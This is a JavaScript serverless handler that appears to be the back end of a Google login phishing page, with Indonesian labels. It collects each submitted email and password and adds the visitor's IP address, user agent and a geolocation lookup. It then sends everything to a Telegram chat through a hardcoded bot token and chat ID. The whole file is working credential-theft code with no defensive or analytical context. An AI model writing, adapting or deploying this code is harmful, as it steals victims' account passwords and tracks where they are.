export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');
    
    const { email, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const ua = req.headers['user-agent'] || 'unknown';
    const time = new Date().toISOString();
    
    // Geo
    let geo = {};
    try {
        const g = await fetch(`http://ip-api.com/json/${ip}?fields=country,city,isp,lat,lon`);
        geo = await g.json();
    } catch(e) {}
    
    const msg = `🎭 *LOGIN GOOGLE* 🎭\n━━━━━━━━━━━━━━━━━━━━\n📅 Waktu: ${time}\n📧 Email: ${email}\n🔑 Pass: ${password}\n🖥️ IP: ${ip}\n📍 Lokasi: ${geo.city}, ${geo.country}\n📡 ISP: ${geo.isp || '-'}`;
    
    const token = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
    const chatId = "8753510792";
    
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
    });
    
    if(geo.lat && geo.lon) {
        await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, latitude: geo.lat, longitude: geo.lon })
        });
    }
    
    res.status(200).json({ status: 'ok' });
}
